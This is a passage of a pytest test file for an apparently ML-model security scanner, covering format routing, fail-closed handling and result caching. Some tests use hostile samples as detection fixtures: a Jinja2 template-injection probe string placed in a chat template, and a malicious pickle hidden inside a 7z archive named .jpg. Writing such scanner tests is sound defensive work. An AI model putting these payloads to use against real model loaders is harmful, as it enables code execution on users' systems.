    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    unavailable_onnx = tmp_path / "model.onnx"
    unavailable_onnx.write_bytes(b"recognized-format")

    monkeypatch.setattr(core_module, "detect_file_format", lambda _path: "onnx")
    monkeypatch.setattr(core_module, "detect_file_format_from_magic", lambda _path: "onnx")
    monkeypatch.setattr(core_module, "detect_format_from_extension", lambda _path: "onnx")
    monkeypatch.setattr(core_module._registry, "load_scanner_by_id", lambda _scanner_id: None)
    monkeypatch.setattr(core_module._registry, "get_scanner_for_path", lambda *_args, **_kwargs: None)

    result = scan_file(str(unavailable_onnx))

    assert result.scanner_name == "unknown"
    assert result.success is False
    assert result.has_errors is False
    assert result.metadata["scan_outcome"] == "inconclusive"
    assert result.metadata["analysis_incomplete"] is True
    assert result.metadata["operational_error"] is True
    assert result.metadata["operational_error_reason"] == "recognized_format_scanner_unavailable"
    assert "recognized_format_scanner_unavailable" in result.metadata["scan_outcome_reasons"]

    check = next(check for check in result.checks if check.name == "Format Detection")
    assert check.severity == IssueSeverity.INFO
    assert "Recognized format could not be scanned" in check.message
    assert check.details["format"] == "onnx"
    assert check.details["preferred_scanner_id"] == "onnx"

    aggregate = core_module.scan_model_directory_or_file(str(unavailable_onnx))
    assert aggregate.success is False
    assert core_module.determine_exit_code(aggregate) == 2


def test_scan_file_does_not_fail_closed_for_extension_only_recognized_format(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    generic_pb = tmp_path / "metadata.pb"
    generic_pb.write_bytes(b"plain protobuf-ish bytes")

    monkeypatch.setattr(core_module._registry, "load_scanner_by_id", lambda _scanner_id: None)
    monkeypatch.setattr(core_module._registry, "get_scanner_for_path", lambda *_args, **_kwargs: None)

    result = scan_file(str(generic_pb))

    assert result.scanner_name == "unknown"
    assert result.success is True
    assert result.metadata.get("scan_outcome") != "inconclusive"
    assert not any(check.name == "Format Detection" for check in result.checks)


def test_scan_file_unavailable_recognized_format_result_is_not_cached(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    unavailable_onnx = tmp_path / "model.onnx"
    unavailable_onnx.write_bytes(b"recognized-format")
    cache_dir = tmp_path / "cache"
    config = {
        "cache_enabled": True,
        "cache_dir": str(cache_dir),
        "min_cache_file_size": 0,
    }

    monkeypatch.setattr(core_module, "detect_file_format", lambda _path: "onnx")
    monkeypatch.setattr(core_module, "detect_file_format_from_magic", lambda _path: "onnx")
    monkeypatch.setattr(core_module, "detect_format_from_extension", lambda _path: "onnx")
    monkeypatch.setattr(core_module._registry, "load_scanner_by_id", lambda _scanner_id: None)
    monkeypatch.setattr(core_module._registry, "get_scanner_for_path", lambda *_args, **_kwargs: None)

    reset_cache_manager()
    try:
        first = scan_file(str(unavailable_onnx), config=config)
        second = scan_file(str(unavailable_onnx), config=config)

        assert first.success is False
        assert second.success is False
        assert first.metadata["scan_outcome"] == "inconclusive"
        assert second.metadata["scan_outcome"] == "inconclusive"
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


def test_scan_file_fails_closed_when_xml_root_is_beyond_bounded_probe(tmp_path: Path) -> None:
    ambiguous_xml = tmp_path / "payload.txt"
    ambiguous_xml.write_text(
        "<?xml version='1.0'?><!--" + ("x" * ((1024 * 1024) + 64)) + "--><PMML version='4.4'></PMML>",
        encoding="utf-8",
    )

    result = scan_file(str(ambiguous_xml), config={"cache_scan_results": False})

    assert result.scanner_name == "unknown"
    assert result.success is False
    assert result.metadata["scan_outcome"] == "inconclusive"
    assert result.metadata["operational_error_reason"] == "xml_model_routing_incomplete"
    check = next(check for check in result.checks if check.name == "XML Model Routing")
    assert "bounded probe ended before the first structural root element" in check.message


def test_scan_file_incomplete_xml_routing_result_is_not_cached(tmp_path: Path) -> None:
    ambiguous_xml = tmp_path / "payload.txt"
    ambiguous_xml.write_text(
        "<?xml version='1.0'?><!--" + ("x" * ((1024 * 1024) + 64)) + "--><PMML version='4.4'></PMML>",
        encoding="utf-8",
    )
    cache_dir = tmp_path / "cache"
    config = {
        "cache_enabled": True,
        "cache_dir": str(cache_dir),
        "min_cache_file_size": 0,
    }

    reset_cache_manager()
    try:
        first = scan_file(str(ambiguous_xml), config=config)
        second = scan_file(str(ambiguous_xml), config=config)

        assert first.success is False
        assert second.success is False
        assert first.metadata["scan_outcome"] == "inconclusive"
        assert second.metadata["scan_outcome"] == "inconclusive"
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


def test_scan_file_ignores_benign_onnx_token_near_match(tmp_path: Path) -> None:
    near_match = tmp_path / "note.payload"
    near_match.write_bytes(b"this documentation mentions onnx but is not a model")

    result = scan_file(str(near_match))

    assert result.scanner_name == "unknown"
    assert result.issues == []


def test_scan_file_routes_misnamed_numpy_by_header(tmp_path: Path) -> None:
    np = pytest.importorskip("numpy")

    disguised_numpy = tmp_path / "weights.payload"
    with disguised_numpy.open("wb") as handle:
        np.save(handle, np.array([1, 2, 3], dtype=np.float32), allow_pickle=False)

    result = scan_file(str(disguised_numpy))

    assert result.scanner_name == "numpy"


def test_scan_file_routes_misnamed_sevenzip_by_header(tmp_path: Path) -> None:
    py7zr = pytest.importorskip("py7zr")

    disguised_7z = tmp_path / "archive.jpg"
    payload = tmp_path / "payload.pkl"
    payload.write_bytes(_build_malicious_pickle())

    with py7zr.SevenZipFile(disguised_7z, "w") as archive:
        archive.write(payload, arcname="payload.pkl")

    result = scan_file(str(disguised_7z))

    assert result.scanner_name == "sevenzip"
    assert any("payload.pkl" in (issue.location or "") for issue in result.issues)


def test_scan_file_fails_closed_on_rar_archive(tmp_path: Path) -> None:
    rar_path = tmp_path / "archive.rar"
    rar_path.write_bytes(b"Rar!\x1a\x07\x01\x00" + b"\x00" * 32)

    result = scan_file(str(rar_path), config={"cache_scan_results": False})

    assert result.scanner_name == "rar"
    assert result.success is False
    assert result.metadata["scan_outcome"] == "inconclusive"
    assert "rar_archive_unsupported" in result.metadata["scan_outcome_reasons"]
    rar_check = next(check for check in result.checks if check.name == "RAR Archive Support")
    assert rar_check.severity == IssueSeverity.INFO
    assert "RAR archive contents were not scanned" in rar_check.message


def test_scan_file_does_not_fail_closed_on_rar_suffix_near_match(tmp_path: Path) -> None:
    rar_path = tmp_path / "not_really.rar"
    rar_path.write_text("plain text, not a RAR archive\n", encoding="utf-8")

    result = scan_file(str(rar_path), config={"cache_scan_results": False})

    assert result.scanner_name != "rar"
    assert result.metadata.get("scan_outcome") != "inconclusive"
    assert not any(check.name == "RAR Archive Support" for check in result.checks)


def test_scan_file_rar_inconclusive_result_is_not_cached(tmp_path: Path) -> None:
    rar_path = tmp_path / "archive.rar"
    rar_path.write_bytes(b"Rar!\x1a\x07\x01\x00" + b"\x00" * 32)
    cache_dir = tmp_path / "cache"
    config = {
        "cache_enabled": True,
        "cache_dir": str(cache_dir),
        "min_cache_file_size": 0,
    }

    reset_cache_manager()
    try:
        first = scan_file(str(rar_path), config=config)
        second = scan_file(str(rar_path), config=config)

        assert first.success is False
        assert second.success is False
        assert first.metadata["scan_outcome"] == "inconclusive"
        assert second.metadata["scan_outcome"] == "inconclusive"
        assert get_cache_manager(str(cache_dir), enabled=True).get_stats()["total_entries"] == 0
    finally:
        reset_cache_manager()


def test_scan_file_routes_readme_documentation_to_metadata_scanner(tmp_path: Path) -> None:
    readme_path = tmp_path / "README.md"
    readme_path.write_text("# Model Card\n\nThis README is benign.\n")

    result = scan_file(str(readme_path), config={"cache_scan_results": False})

    assert result.scanner_name == "metadata"
    assert result.success is True


def test_scan_file_routes_model_config_json_to_manifest_scanner(tmp_path: Path) -> None:
    manifest_path = tmp_path / "config.json"
    manifest_path.write_text(
        json.dumps(
            {
                "model_type": "bert",
                "architectures": ["BertModel"],
                "hidden_size": 768,
            }
        )
    )

    result = scan_file(str(manifest_path), config={"cache_scan_results": False})

    assert result.scanner_name == "manifest"
    assert result.success is True


def test_directory_child_probe_stops_at_limit(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    def bounded_iterdir(self: Path) -> Iterator[Path]:
        for index in range(core_module._DIRECTORY_PRECOUNT_CHILD_LIMIT):
            yield self / f"child_{index}"
        raise AssertionError("directory child probe consumed past its limit")

    monkeypatch.setattr(Path, "iterdir", bounded_iterdir)

    assert (
        core_module._count_immediate_children_up_to(
            tmp_path,
            core_module._DIRECTORY_PRECOUNT_CHILD_LIMIT,
        )
        == core_module._DIRECTORY_PRECOUNT_CHILD_LIMIT
    )


def test_directory_file_probe_stops_after_limit(monkeypatch: pytest.MonkeyPatch, tmp_path: Path) -> None:
    def bounded_rglob(self: Path, pattern: str) -> Iterator[Path]:
        assert pattern == "*"
        for index in range(core_module._DIRECTORY_PRECOUNT_CHILD_LIMIT + 1):
            child = self / f"child_{index}.pkl"
            child.touch()
            yield child
        raise AssertionError("directory file probe consumed past its limit")

    monkeypatch.setattr(Path, "rglob", bounded_rglob)

    assert (
        core_module._count_files_up_to(
            tmp_path,
            core_module._DIRECTORY_PRECOUNT_CHILD_LIMIT,
        )
        is None
    )


def test_scan_directory_without_progress_skips_file_counting(
    tmp_path: Path,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    model_path = tmp_path / "model.pkl"
    model_path.write_bytes(b"\x80\x04N.")

    def fail_rglob(self: Path, pattern: str) -> Iterator[Path]:
        raise AssertionError(f"unexpected rglob({pattern!r}) for {self}")

    monkeypatch.setattr(Path, "rglob", fail_rglob)

    result = scan_model_directory_or_file(
        str(tmp_path),
        cache_scan_results=False,
    )

    assert result.files_scanned == 1


def test_scan_file_routes_manifest_owned_chat_templates_through_jinja_analysis(tmp_path: Path) -> None:
    manifest_path = tmp_path / "config.json"
    manifest_path.write_text(
        json.dumps(
            {
                "model_type": "llama",
                "chat_template": "{{ ''.__class__.__mro__[1].__subclasses__() }}",
            }
        )
    )

    result = scan_file(str(manifest_path), config={"cache_scan_results": False})

    assert result.scanner_name == "manifest"
    assert any(
        check.name == "Jinja2 Template Injection Detection" and check.status == CheckStatus.FAILED
        for check in result.checks
    )
